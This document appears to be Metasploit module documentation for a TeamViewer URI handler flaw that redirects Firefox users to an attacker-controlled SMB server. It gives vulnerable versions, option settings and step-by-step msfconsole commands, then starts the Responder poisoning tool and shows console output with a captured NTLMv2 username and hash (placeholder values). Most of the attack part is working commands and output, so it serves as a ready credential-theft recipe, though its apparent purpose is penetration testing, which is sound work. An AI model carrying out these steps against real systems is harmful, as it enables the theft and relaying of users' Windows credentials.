## Vulnerable Application

This module exploits an unquoted parameter call within the
Teamviewer URI handler to create an SMB connection to an attacker
controlled IP.

TeamViewer < 8.0.258861, 9.0.258860, 10.0.258873,
11.0.258870, 12.0.258869, 13.2.36220, 14.2.56676, 14.7.48350, and
15.8.3 are vulnerable.

Only Firefox can be exploited by this
vulnerability, as all other browsers encode the space after 'play'
and before the SMB location, preventing successful exploitation.

Teamviewer 15.4.4445, and 8.0.16642 were successfully tested against.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/server/teamviewer_uri_smb_redirect`
1. Do: `set SMB_SERVER [IP]`
1. Do: `run`
1. Start an SMB Capture or Relay server (such as responder)
1. Open the URL on the target
1. The SMB Server should receive a connection.

## Options

### FILE_NAME

The SMB file to link to.  This is an arbitrary file name.  Default is `\\teamviewer\\config.tvs`

### SMB_SERVER

The SMB server IP address.

### URI_HANDLER

The URI Handler to use.  Typically the default `teamviewer10`

## Scenarios

### TeamViewer 15.4.4445 on Windows 10 1909 with Firefox 79

```
[*] Processing teamviewer.rb for ERB directives.
resource (teamviewer.rb)> use auxiliary/server/teamviewer_uri_smb_redirect
resource (teamviewer.rb)> set smb_server 2.2.2.2
smb_server => 2.2.2.2
resource (teamviewer.rb)> run -j
[*] Auxiliary module running as background job 0.
[+] Please start an SMB capture/relay on 2.2.2.2
[*] Using URL: http://0.0.0.0:8080/IDGynsGNfXD5eFB
[*] Local IP: http://1.1.1.1:8080/IDGynsGNfXD5eFB
[*] Server started.
```

Start the SMB replay/capture

```
resource (teamviewer.rb)> sudo responder -I wlan0
[*] exec: sudo responder -I wlan0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.0.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [2.2.2.2]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[!] Error starting TCP server on port 80, check permissions or other servers running.
[+] Listening for events...
[*] Request received for: /IDGynsGNfXD5eFB
[*] Sending TeamViewer Link to Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0...
[SMB] NTLMv2-SSP Client   : 3.3.3.3
[SMB] NTLMv2-SSP Username : DESKTOP\h00die
[SMB] NTLMv2-SSP Hash     : h00die::DESKTOP:1111111111111111:11111111111111111111111111111111:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```
